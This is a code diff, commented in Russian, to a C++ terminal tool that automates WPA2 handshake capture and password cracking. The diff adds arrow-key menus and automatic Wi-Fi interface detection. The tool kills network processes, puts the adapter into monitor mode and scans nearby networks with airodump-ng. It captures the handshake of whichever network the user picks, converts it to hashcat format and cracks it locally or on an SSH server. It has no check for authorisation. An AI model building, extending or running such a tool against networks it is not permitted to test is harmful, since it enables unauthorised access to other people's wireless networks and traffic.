@@ -25,10 +25,16 @@
 #include <fstream> 
 #include <sys/wait.h>
 #include <iomanip>  
+#include <unistd.h>   
+#include <termios.h>
 #define Red "\033[0;31m"
 #define Green "\033[0;32m"
 #define white "\033[0;37m"
 #define blue "\033[0;34m"
+#define HIGHLIGHT "\033[7m"  // включить инверсию
+#define RESET_COLOR "\033[0m" // выключить всё (вернуть как было)
+#include <sstream>
+#include <vector>
 
 const std::string RESET = "\033[0m";
 const std::string YELLOW = "\033[33m";
@@ -37,10 +43,154 @@ const std::string CYAN = "\033[36m";
 const std::string BOLD = "\033[1m";
 const std::string UNDERLINE = "\033[4m";
 
-#include <fstream>
-#include <sstream>
-#include <vector>
-#include <string>
+
+struct WiFiNetwork {
+    std::string bssid;      // MAC адрес точки доступа
+    std::string essid;      // имя сети (SSID)
+    std::string channel;    // номер канала
+    std::string encryption; // тип шифрования (WPA2, WPA3 и т.д.)
+};
+
+//-----------------------------------------------------
+//   Настраиваем терминал для работы со стрелками
+//-----------------------------------------------------
+
+
+static struct termios g_orig_termios;//создаём структуру для хранения базовых настроек терминала
+void enable_raw_mode(){
+    struct termios raw_termios; //создаём структуру для хранения новых настроек терминала
+    int result = tcgetattr(STDIN_FILENO, &g_orig_termios); // переходим в режим ядра и создаём переменнуб для хранения кодов возврата
+    if (result == -1){ //обработка ошибок если от result
+        perror("tcgeatattr error");
+        exit(1);
+    }
+    raw_termios = g_orig_termios; //копируем по байту изначальные настройки что ранее получили из перемнной result
+    raw_termios.c_lflag &= ~(ICANON | ECHO); //🥁 я заманаюсь это расписывать, но тут мы короче просто выключаем 2 бита для отключения макросов ICON и Echo
+    raw_termios.c_cc[VMIN] = 1; // сколько вернёт read
+    raw_termios.c_cc[VTIME] = 0; // сколько будут ждать 0=вечно
+    tcsetattr(STDIN_FILENO, TCSANOW, &raw_termios); // применяем все настройки
+    
+}
+
+void disable_raw_mode(){
+    tcsetattr(STDIN_FILENO, TCSANOW, &g_orig_termios); // Восстанавливаем из глобальной переменной
+}
+
+//-----------------------------------------------------
+//             Управление при помощи стрелочек
+//-----------------------------------------------------
+
+int get_keypress(){ //переменная для управления стрелочками
+    char ch; // переменная для считавания ровно одного символа.
+    char seq[2]; //создаём статический масив
+    read(STDIN_FILENO, &ch, 1); //Читаем 1 байт из ввода
+    if (ch == '\033'){
+        read(STDIN_FILENO, &seq[0], 1); //читаем один байт с ввода клавиатуры ложа в нулевой индекс seq
+        read(STDIN_FILENO, &seq[1], 1); //читаем один байт с ввода клавиатуры ложа в первый индекс seq
+        if(seq[0]=='['){ // проверяем является ли байт стрелочкой
+            if(seq[1]=='A') return 1000; //Ессли первый индекс содержит A поднимаемся вверх
+            if(seq[1]=='B') return 1001; //Если второй индекс содержит В опускаемся
+            if(seq[1]=='D') return 2000; 
+        }
+        return 999;
+    }
+    else if (ch == '\n'){//елси получаем Enter выбираем опцию
+    return 2000;
+    }
+    else{
+        return ch; //не стрелка не Enter
+    }
+}
+
+//-----------------------------------------------------
+//               МЕНЮ
+//-----------------------------------------------------
+
+void draw_menu(int selected){
+    system("clear");
+    std::cout<<Green<<"============================================="<<white<<std::endl;
+    std::cout<<Red<<"выберите дейстиве"<<white<<std::endl;
+// перехват пакета
+    if(selected==0){
+        std::cout<<HIGHLIGHT<<"> 1 перехват пакета" << RESET << std::endl;
+    }
+    else{
+        std::cout << blue << "1 перехват пакета" << white << std::endl; 
+    }
+//перекодировка в 22000
+    if(selected == 1){
+        std::cout << HIGHLIGHT << "> 2 перевести в формат 22000" << RESET << std::endl;
+    }
+    else {
+        std::cout << blue << "2 перевести в формат 22000" << white << std::endl;
+    }
+//расшифровка
+    if(selected == 2){
+        std::cout<<HIGHLIGHT<<"> 3 расшифровка" << RESET << std::endl;
+    }
+    else{
+        std::cout << CYAN << "3 расшифровка" << white<<std::endl;
+        std::cout << "Нажми Enter или ➔";
+    }
+    
+}
+
+void draw_decrypt_menu(int selected) {
+    std::cout << "=============================================" << std::endl;
+    std::cout << Red << "выберите действие:" << white << std::endl;
+    
+    if (selected == 0) {
+        std::cout << HIGHLIGHT << "> 1 - расшифровать локально" << RESET << std::endl;
+    } else {
+        std::cout << blue << "  1 - расшифровать локально" << white << std::endl;
+    }
+    
+    if (selected == 1) {
+        std::cout << HIGHLIGHT << "> 2 - отправить на сервер и расшифровать" << RESET << std::endl;
+    } else {
+        std::cout << blue << "  2 - отправить на сервер и расшифровать" << white << std::endl;
+    }
+    
+    std::cout << "=============================================" << std::endl;
+    std::cout << "↑/↓ для навигации, Enter для выбора" << std::endl;
+}
+
+
+void draw_networks_menu(const std::vector<WiFiNetwork>& networks, int selected, int scroll_offset) {
+    system("clear");
+    
+    std::cout << Green << "=============================================" << RESET << std::endl;
+    std::cout << Red << "Доступные Wi-Fi сети:" << RESET << std::endl;
+    std::cout << Green << "=============================================" << RESET << std::endl;
+    
+    const int MAX_VISIBLE = 10;
+    int start = scroll_offset;
+    int end = std::min(start + MAX_VISIBLE, (int)networks.size());
+    
+    for (int i = start; i < end; i++) {
+        if (i == selected) {
+            std::cout << HIGHLIGHT << "> " 
+                      << networks[i].essid << " | "
+                      << "канал " << networks[i].channel << " | "
+                      << networks[i].encryption
+                      << RESET << std::endl;
+        } else {
+            std::cout << "  " << networks[i].essid << " | "
+                      << "канал " << networks[i].channel << " | "
+                      << networks[i].encryption << std::endl;
+        }
+    }
+    
+    std::cout << Green << "=============================================" << RESET << std::endl;
+    std::cout << CYAN << "↑/↓ - навигация, Enter - выбрать, q - выход" << RESET << std::endl;
+}
+
+
+//-----------------------------------------------------
+//               защита от дебила rm -rf
+//-----------------------------------------------------
+
+
 
 // Экранирование спецсимволов для защиты от инъекций
 std::string shellEscape(const std::string& arg) {
@@ -57,6 +207,9 @@ std::string shellEscape(const std::string& arg) {
     return escaped;
 }
 
+//-----------------------------------------------------
+// блок функций для отключенеия вывода команд и считывания CSV
+//-----------------------------------------------------
 
 class TimedCommandReader {
 private:
@@ -151,19 +304,6 @@ std::vector<std::vector<std::string>> readCSV(const std::string& filename) {
 
 
 
-void signalHandler(int signum) {
-    std::cout << "\n\n[!] Останавливаем мониторинг..." << std::endl;
-    std::system("sudo airmon-ng stop wlp0s20f3mon");
-    std::system("sudo systemctl restart NetworkManager");
-    std::cout << "[+] Настройки восстановлены. Выход." << std::endl;
-    
-    // Очищаем состояние cin
-    std::cin.clear();
-    // Игнорируем оставшиеся символы
-    std::cin.ignore(10000, '\n');
-    
-    exit(0);
-}
 std::string resolvePathStrict(const std::string& path) {
     if (path.empty()) return "";
     
@@ -181,6 +321,10 @@ std::string resolvePathStrict(const std::string& path) {
         return result;
     }
 }
+
+//-----------------------------------------------------
+//               красивый бар загрузки
+//-----------------------------------------------------
 
 void printBar(int seconds) {
     const int BAR_WIDTH = 32;
@@ -233,103 +377,264 @@ std::string getFreeFilename(const std::string& base_name) {
     return base_name + "-" + std::to_string(time(nullptr));
 }
 
-void check_wifi(std::string& out_bssid, std::string& out_channel, std::string& target_name) {
-    std::string file_prefix = getFreeFilename("scan_result");
+//-----------------------------------------------------
+//               проверка вайфай сети
+//-----------------------------------------------------
+
+
+
+std::string find_wifi_interface() {
+    // Функция ищет любой интерфейс с "wl" в названии (wlan0, wlp0s20f3 и т.д.)
+    FILE* pipe = popen("ip link show | grep -oE 'wl[a-zA-Z0-9]+' | head -1", "r");
+    if (!pipe) {
+        std::cerr << Red << "Не удалось выполнить команду поиска интерфейса" << RESET << std::endl;
+        return "";
+    }
     
-    // Останавливаем старый интерфейс и мешающие процессы
-    std::system("sudo airmon-ng stop wlp0s20f3mon 2>/dev/null");
-    std::system("sudo airmon-ng check kill");
-    std::system("sudo airmon-ng start wlp0s20f3");
-    
-    // Даём время на создание интерфейса
-    std::this_thread::sleep_for(std::chrono::seconds(2));
-    
-    std::string command = "sudo airodump-ng wlp0s20f3mon --write " + file_prefix + 
-                      " --output-format csv --write-interval 1";
-    
-    TimedCommandReader reader(command);
-    std::cout << "Сканирование сетей..." << std::endl;
-    printBar(30);  // Увеличил до 30 секунд
-    reader.stopAndRead();
-    
-    // Даём время на запись файла
-    std::this_thread::sleep_for(std::chrono::seconds(1));
-    
-    std::string csv_path = file_prefix + "-01.csv";
-    auto networks = readCSV(csv_path);
-    
-    bool found = false;
-    
-    for (size_t i = 0; i < networks.size(); i++) {
-        std::string essid = networks[i][13];
-        
-        if (essid.find(target_name) != std::string::npos) {
-            out_bssid = networks[i][0];
-            out_channel = networks[i][3];
-            found = true;
-            
-            std::cout << "Найдена сеть: " << essid << std::endl;
-            std::cout << "BSSID: " << out_bssid << std::endl;
-            std::cout << "Канал: " << out_channel << std::endl;
-            break;
+    char buffer[128];
+    std::string interface;
+    if (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
+        // fgets читает строку из pipe в buffer
+        interface = buffer;
+        // удаляем символ новой строки
+        if (!interface.empty() && interface.back() == '\n') {
+            interface.pop_back();
         }
     }
     
-    if (!found) {
-        std::cout << "Сеть с таким названием не найдена. Доступные сети:" << std::endl;
-        for (const auto& net : networks) {
-            if (net.size() > 13 && !net[13].empty()) {
-                std::cout << " - " << net[13] << std::endl;
-            }
-        }
-        out_bssid = "";
-        out_channel = "";
+    pclose(pipe);  // закрываем pipe
+    
+    if (interface.empty()) {
+        std::cerr << Red << "Wi-Fi интерфейс не найден!" << RESET << std::endl;
+        std::cerr << "Проверьте: подключен ли Wi-Fi адаптер?" << std::endl;
+        return "";
     }
     
+    return interface;
+}
+void signalHandler(int signum) {
+    std::cout << "\n\n[!] Останавливаем мониторинг..." << std::endl;
+    std::string interface = find_wifi_interface();
+    if (!interface.empty()) {
+        std::system(("sudo airmon-ng stop " + interface + "mon 2>/dev/null").c_str());
+    }
+    std::system("sudo systemctl restart NetworkManager");
+    std::cout << "[+] Настройки восстановлены. Выход." << std::endl;
+    
+    // Очищаем состояние cin
+    std::cin.clear();
+    // Игнорируем оставшиеся символы
+    std::cin.ignore(10000, '\n');
+    
+    exit(0);
 }
 
-//сохраняем путь в которых хранится файл, так же делаем переменную target_name глобальной поскольку она сохраняет имя файла
+//-----------------------------------------------------
+//      сканирование сетей и возврат списка
+//-----------------------------------------------------
+
+std::vector<WiFiNetwork> check_wifi(const std::string& interface) {
+  
+    std::vector<WiFiNetwork> networks;  // пустой список сетей
+    
+    // Генерируем уникальное имя для временного файла
+    std::string file_prefix = getFreeFilename("scan_result");
+    // getFreeFilename создаёт имя типа "scan_result_001", "scan_result_002" и т.д.
+    
+    // Останавливаем monitor режим если был активен
+    std::string stop_cmd = "sudo airmon-ng stop " + interface + "mon 2>/dev/null";
+    std::system(stop_cmd.c_str());  // 2>/dev/null - скрываем ошибки
+    
+    // Убиваем мешающие процессы (NetworkManager, dhclient и т.д.)
+    std::system("sudo airmon-ng check kill");
+    
+    // Включаем monitor режим на интерфейсе
+    std::string start_cmd = "sudo airmon-ng start " + interface;
+    std::system(start_cmd.c_str());
+    
+    // Даём время на создание monitor интерфейса
+    std::this_thread::sleep_for(std::chrono::seconds(2));
+    
+    std::string mon_interface = interface + "mon";  // например "wlp0s20f3mon"
+    
+    // Формируем команду для airodump-ng
+    std::string command = "sudo airodump-ng " + mon_interface + 
+                         " --write " + file_prefix + 
+                         " --output-format csv --write-interval 1";
+    
+    TimedCommandReader reader(command);
+    std::cout << CYAN << "Сканирование сетей... (30 секунд)" << RESET << std::endl;
+    printBar(30);  
+    reader.stopAndRead();  // ждём 30 секунд и останавливаем
+    
+    // Даём время на запись последних данных в файл
+    std::this_thread::sleep_for(std::chrono::seconds(1));
+    
+    // Формируем путь к CSV файлу
+    std::string csv_path = file_prefix + "-01.csv";
+    // airodump-ng добавляет "-01" к имени файла
+    
+    auto csv_data = readCSV(csv_path);  
+    
+    // Парсим CSV данные
+    for (const auto& row : csv_data) {
+        // row - это vector<string>, одна строка из CSV
+        
+        // Проверяем: строка содержит ESSID (13 колонка) и BSSID (0 колонка)
+        if (row.size() > 13 && !row[13].empty() && row[0].size() == 17) {
+            // row[0].size() == 17 - проверка что BSSID имеет формат XX:XX:XX:XX:XX:XX
+            
+            WiFiNetwork net;  // создаём структуру для сети
+            net.bssid = row[0];        // BSSID всегда в первой колонке
+            net.channel = row[3];      // канал в четвёртой колонке
+            net.essid = row[13];       // имя сети в 14-й колонке
+            
+            // Шифрование в 6-й колонке (индекс 5), если есть
+            if (row.size() > 5) {
+                net.encryption = row[5];
+            } else {
+                net.encryption = "Unknown";
+            }
+            
+            networks.push_back(net);   // добавляем в список
+        }
+    }
+    
+    return networks;  // возвращаем список всех найденных сетей
+}
+
+
+
+//-----------------------------------------------------
+//             первая опция (перехват handshake)
+//-----------------------------------------------------
+
 
 
 void capture_wpa_handshake() {
-    std::string BSSID;
-    std::string Number_chanel;
-    std::string target_name;
+
+    std::string wifi_interface = find_wifi_interface();
+    // Вызываем функцию поиска интерфейса
     
-    std::cout << "Пожалуйста введите название сети для перехвата хешей: " << std::endl;
-    std::cin >> target_name;
-    
-    // Константный путь сохранения
-    const char* home = std::getenv("HOME");
-    std::string handshake_dir = std::string(home) + "/Automated-WPA2-Handshake-Cracking-Script/handshake";
-    std::system(("mkdir -p " + handshake_dir).c_str());
-    
-    // Находим BSSID и канал по названию сети
-    check_wifi(BSSID, Number_chanel, target_name);
-    
-    if (BSSID.empty()) {
-        std::cout << "Сеть не найдена. Завершение." << std::endl;
+    if (wifi_interface.empty()) {
+        // Если интерфейс не найден
+        std::cerr << Red << "Wi-Fi интерфейс не найден!" << RESET << std::endl;
+        std::cerr << "Убедитесь, что Wi-Fi адаптер подключен и включен" << std::endl;
         return;
     }
     
+    std::cout << Green << "Найден Wi-Fi интерфейс: " << wifi_interface << RESET << std::endl;
+    enable_raw_mode();
+    std::cout << "Начинаю сканирование сетей..." << std::endl;
+    
+
+    std::vector<WiFiNetwork> networks = check_wifi(wifi_interface);
+    // scan_networks вернёт список всех обнаруженных сетей
+    
+    if (networks.empty()) {
+        // Если сетей нет
+        std::cerr << Red << "Сети не найдены!" << RESET << std::endl;
+        std::cerr << "Проверьте: включён ли Wi-Fi, есть ли доступные сети" << std::endl;
+        return;
+    }
+    
+    int selected = 0;           // индекс выбранной сети
+    int scroll_offset = 0;      // сколько сетей пропущено
+    int running = 1;            // флаг работы меню
+    
+    // Первая отрисовка
+    draw_networks_menu(networks, selected, scroll_offset);
+    
+    while (running) {
+        int key = get_keypress();  // читаем нажатие клавиши
+        
+        switch (key) {
+            case 1000:  // стрелка вверх
+                if (selected > 0) {
+                    selected--;
+                    // Корректируем прокрутку если вышли за верх
+                    if (selected < scroll_offset) {
+                        scroll_offset = selected;
+                    }
+                    draw_networks_menu(networks, selected, scroll_offset);
+                }
+                break;
+                
+            case 1001:  // стрелка вниз
+                if (selected < (int)networks.size() - 1) {
+                    selected++;
+                    // Корректируем прокрутку если вышли за низ
+                    if (selected >= scroll_offset + 10) {
+                        scroll_offset = selected - 9;
+                    }
+                    draw_networks_menu(networks, selected, scroll_offset);
+                }
+                break;
+                
+            case 2000:  // Enter - выбираем сеть
+                running = 0;
+                break;
+                
+            case 'q':   // выход
+            case 'Q':
+                std::cout << "Сканирование отменено" << std::endl;
+                return;
+        }
+    }
+    
+    std::string target_name = networks[selected].essid;
+    std::string BSSID = networks[selected].bssid;
+    std::string Number_chanel = networks[selected].channel;
+    
+    std::cout << "\n" << Green << "Выбрана сеть: " << target_name << RESET << std::endl;
+    std::cout << "BSSID: " << BSSID << std::endl;
+    std::cout << "Канал: " << Number_chanel << std::endl;
+    
+
+    const char* home = std::getenv("HOME");
+    std::string handshake_dir = std::string(home) + "/Automated-WPA2-Handshake-Cracking-Script/handshake";
+    
+    // Создаём папку если её нет
+    std::system(("mkdir -p " + handshake_dir).c_str());
+    // mkdir -p - создаёт папку и все промежуточные директории
+    
+    // Останавливаем monitor режим если был активен (освобождаем интерфейс)
+    std::system(("sudo airmon-ng stop " + wifi_interface + "mon 2>/dev/null").c_str());
+    
+    // Заново включаем monitor режим на нужном канале
+    std::system(("sudo airmon-ng start " + wifi_interface + " " + Number_chanel).c_str());
+    // Здесь мы сразу указываем канал, чтобы airodump работал на правильной частоте
+    
+    std::string mon_interface = wifi_interface + "mon";
+    
+    // Даём время на активацию
+    std::this_thread::sleep_for(std::chrono::seconds(2));
+    
+
     std::cout << "\n=============================================" << std::endl;
     std::cout << "Начинаем перехват handshake для сети: " << target_name << std::endl;
     std::cout << "BSSID: " << BSSID << " | Канал: " << Number_chanel << std::endl;
-    std::cout << "Файлы будут сохранены в: " << handshake_dir << std::endl;
+    std::cout << "Файлы будут сохранены в: " << handshake_dir << "/" << target_name << std::endl;
     std::cout << "=============================================" << std::endl;
     std::cout << "\n[!] Нажмите Ctrl+C, когда handshake будет пойман" << std::endl;
     std::cout << "[!] Или подождите, пока клиент подключится к сети\n" << std::endl;
     
-
-    std::cout << "Включаем режим тру хацкера и ждём пока кто-нибудь подключится: " << std::endl;
-    printBar(15);
+    // Формируем команду для захвата
+    std::string command = "sudo airodump-ng -c " + Number_chanel + 
+                          " --bssid " + shellEscape(BSSID) + 
+                          " -w " + shellEscape(handshake_dir + "/" + target_name) + 
+                          " " + mon_interface;
     
-    // Запускаем захват
-    std::string commands = "sudo airodump-ng -c " + Number_chanel + 
-                      " --bssid " + shellEscape(BSSID) + 
-                      " -w " + shellEscape(handshake_dir + "/" + target_name) + " wlp0s20f3mon";
-    std::system(commands.c_str());
+    std::cout << CYAN << "Ждём handshake..." << RESET << std::endl;
+    printBar(15);  // небольшая пауза перед захватом
+    
+    std::system(command.c_str());  // Запускаем захват (будет работать пока не нажмут Ctrl+C)
 }
+
+
+//-----------------------------------------------------
+//              =вторая опция
+//-----------------------------------------------------
 
 void convert_to_22000() {
     std::system("sudo airmon-ng stop wlp0s20f3mon");
@@ -377,23 +682,43 @@ bool isSafeFilename(const std::string& filename) {
     return true;
 }
 
-// Основная функция расшифровки
+//-----------------------------------------------------
+//               третья опция
+//-----------------------------------------------------
 void decrypt_wpa() {
     // Путь к папке с хэшами
     const char* home = std::getenv("HOME");
     std::string handshake_dir = std::string(home) + "/Automated-WPA2-Handshake-Cracking-Script/handshake";
     
-    // Меню выбора
-    std::cout << "=============================================" << std::endl;
-    std::cout << Red << "выберите действие:" << white << std::endl;
-    std::cout << blue << "1 - расшифровать локально" << white << std::endl;
-    std::cout << blue << "2 - отправить на сервер и расшифровать" << white << std::endl;
-    std::cout << "=============================================" << std::endl;
-    
-    int local_or_server = 0;
-    std::cout << "пожалуйста введите номер действия: ";
-    std::cin >> local_or_server;
-    
+    int local_or_server = 0;  // 0 = локально, 1 = сервер
+    int running = 1;
+
+    draw_decrypt_menu(local_or_server);
+
+    while (running) {
+        int key = get_keypress();
+        
+        switch (key) {
+            case 1000:  // стрелка вверх
+                if (local_or_server > 0) {
+                    local_or_server--;
+                    draw_decrypt_menu(local_or_server);
+                }
+                break;
+                
+            case 1001:  // стрелка вниз
+                if (local_or_server < 1) {
+                    local_or_server++;
+                    draw_decrypt_menu(local_or_server);
+                }
+                break;
+                
+            case 2000:  // Enter
+                running = 0;
+                break;
+        }
+    }
+        disable_raw_mode();  // ← ДОБАВИТЬ ЭТУ СТРОКУ!
     std::cout << "пожалуйста введите имя файла (без расширения): ";
     std::string file_name = "";
     std::cin >> file_name;
@@ -408,7 +733,7 @@ void decrypt_wpa() {
     std::string full_filename = handshake_dir + "/" + file_name + ".22000";
     
     // ==================== ЛОКАЛЬНАЯ РАСШИФРОВКА ====================
-    if (local_or_server == 1) {
+    if (local_or_server == 0) {
         std::cout << Green << "локальная расшифровка" << white << std::endl;
         
         // Проверяем существование файла
@@ -447,7 +772,7 @@ void decrypt_wpa() {
     }
     
     // ==================== РАСШИФРОВКА ЧЕРЕЗ SSH ====================
-    else if (local_or_server == 2) {
+    else if (local_or_server == 1) {
         std::cout << Green << "отправка на сервер и расшифровка" << white << std::endl;
         
         // Проверяем существование файла
@@ -517,48 +842,76 @@ void decrypt_wpa() {
     }
 }
 
-void Deistvie(int dei){
-    int deistvie = dei;
-    switch (deistvie) {
-        case 1: {std::cout << "очистка мешающих процессов" << std::endl;
+int main() {
+    // Обработчик Ctrl+C
+    std::signal(SIGINT, [](int) { 
+        disable_raw_mode(); 
+        std::cout << "\nВыход..." << std::endl; 
+        exit(0); 
+    });
+
+    enable_raw_mode();  // включаем raw режим ОДИН РАЗ
+
+    int selected = 0;
+    int running = 1;
+
+    draw_menu(selected);
+
+    while (running) {
+        int key = get_keypress();  // ждём нажатие клавиши
+        
+        switch (key) {
+            case 1000:  // стрелка ВВЕРХ
+                if (selected > 0) {
+                    selected--;
+                    draw_menu(selected);
+                }
+                break;
+                
+            case 1001:  // стрелка ВНИЗ
+                if (selected < 2) {
+                    selected++;
+                    draw_menu(selected);
+                }
+                break;
+                
+            case 2000:  // ENTER или стрелка влево
+                running = 0;  // выходим из цикла
+                break;
+                
+            case 'q':   // клавиша q
+            case 'Q':   // заглавная Q
+                disable_raw_mode();
+                std::cout << "До свидания!" << std::endl;
+                return 0;
+                
+            default:
+                // Остальные клавиши игнорируем
+                break;
+        }
+    }  // ← цикл ЗАКРЫВАЕТСЯ ЗДЕСЬ!
+
+    // ============================================
+    // ВСЁ, ЧТО НИЖЕ, ВЫПОЛНЯЕТСЯ ПОСЛЕ ВЫХОДА ИЗ ЦИКЛА
+    // ============================================
+    
+    disable_raw_mode();  // восстанавливаем терминал (ОДИН РАЗ после цикла)
+    system("clear");
+
+    switch (selected) {
+        case 0:
+            std::cout << "Запуск перехвата пакетов..." << std::endl;
             capture_wpa_handshake();
-                break;}
-        case 2:{
+            break;
+        case 1:
+            std::cout << "Конвертация в формат 22000..." << std::endl;
             convert_to_22000();
             break;
-        }
-        
-        case 3: {
-        decrypt_wpa();
-        break;
+        case 2:
+            std::cout << "Запуск подбора..." << std::endl;
+            decrypt_wpa();
+            break;
     }
-        default:
-        std::printf("кек");
-}
-}
-int main() {
-    std::signal(SIGINT, signalHandler);
-    
-    while (true) {
-        std::cout << Green << "=============================================" << white << std::endl; 
-        std::cout << Red << "выберите действие: " << white << std::endl;
-        std::cout << blue << "1 перехватить пакет" << white << std::endl;
-        std::cout << blue << "2 перевести в нужный формат для hashcat" << white << std::endl;
-        std::cout << CYAN << "3 отправить на сервер и начать подбор"<< RESET << std::endl;
-        std::cout << Green << "=============================================" << white << std::endl;
-        
-        int deistvie;
-        std::cout << "пожалуйста введите номер действия: ";
-        
-        if (std::cin >> deistvie) {
-            Deistvie(deistvie);
-        } else {
-            // Если ввод не удался (например, Ctrl+D или ошибка)
-            std::cin.clear();  
-            std::cin.ignore(10000, '\n');  
-            std::cout << Red << "Ошибка ввода! Введите число." << RESET << std::endl;
-        }
-    }
-    
+
     return 0;
 }
